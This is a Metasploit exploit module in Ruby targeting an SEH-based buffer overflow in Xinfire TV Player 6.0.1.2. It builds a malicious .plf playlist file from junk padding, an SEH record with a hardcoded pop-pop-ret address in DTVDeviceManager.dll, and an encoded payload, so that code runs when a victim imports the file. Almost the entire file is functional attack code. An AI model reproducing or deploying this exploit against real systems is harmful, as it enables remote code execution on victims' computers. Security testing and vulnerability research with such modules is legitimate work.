##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::FILEFORMAT
  include Msf::Exploit::Remote::Seh

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Xinfire TV Player Buffer Overflow',
      'Description'    => %q{
        This module exploits a buffer overflow in Xinfire TV Player Pro and Standard v6.0.1.2. When the application is used
        to import a specially crafted plf file, a buffer overflow occurs allowing arbitrary code execution. Tested Win7, Win10. This software is similar as Aviosoft Digital TV Player and BlazeVideo HDTV Player.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'metacom', # MSF Module and Vulnerability discovery /metacom27@gmail.com
        ],
      'References'     =>
        [
          [ 'CVE', '2007-3068' ],
          [ 'OSVDB', '36956' ],
        ],
      'DefaultOptions' =>
        {
          'EXITFUNC' => 'process',
        },
      'Payload'        =>
        {
          'DisableNops' => true,
          'BadChars' => "\x00\x0a\x0d\x1a\x2f\x3a\x5c",
          'Space' => 1384,
        },
      'Platform' => 'win',
      'Targets'        =>
        [
          [ 'Windows Universal', { 'Ret' => 0x613018E9, 'Offset' => 608 } ],	# p/p/r DTVDeviceManager.dll
        ],
      'Privileged'     => false,
      'DisclosureDate' => 'Apr 16 2020',
      'DefaultTarget'  => 0))

    register_options(
      [
        OptString.new('FILENAME', [ false, 'The file name.', 'msf.plf']),
      ])

  end

  def exploit

    buffer = rand_text(target['Offset'])  #junk
    buffer << generate_seh_record(target.ret)
    buffer << payload.encoded  # 1384 bytes of space
    # more junk may be needed to trigger the exception

    file_create(buffer)

  end
end
